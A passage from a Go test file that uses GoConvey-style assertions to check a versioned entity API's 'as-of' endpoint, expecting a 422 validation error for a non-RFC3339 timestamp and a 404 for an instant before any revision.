			Convey("Then it is 422 with the offending value echoed", func() {
				So(resp.Status, ShouldEqual, http.StatusUnprocessableEntity)
				So(resp.errorCode(), ShouldEqual, "VALIDATION")
				So(resp.errorMessage(), ShouldContainSubstring, "RFC3339")
				So(string(resp.Body), ShouldContainSubstring, "yesterday")
			})
		})

		Convey("When the entity is read as of an instant before any revision", func() {
			resp := a.get(entityBase + "/as-of?at=2000-01-01T00:00:00Z")

			Convey("Then it is 404 — there was no such state", func() {
				So(resp.Status, ShouldEqual, http.StatusNotFound)
				So(resp.errorCode(), ShouldEqual, "NOT_FOUND")
			})
		})
	})
}
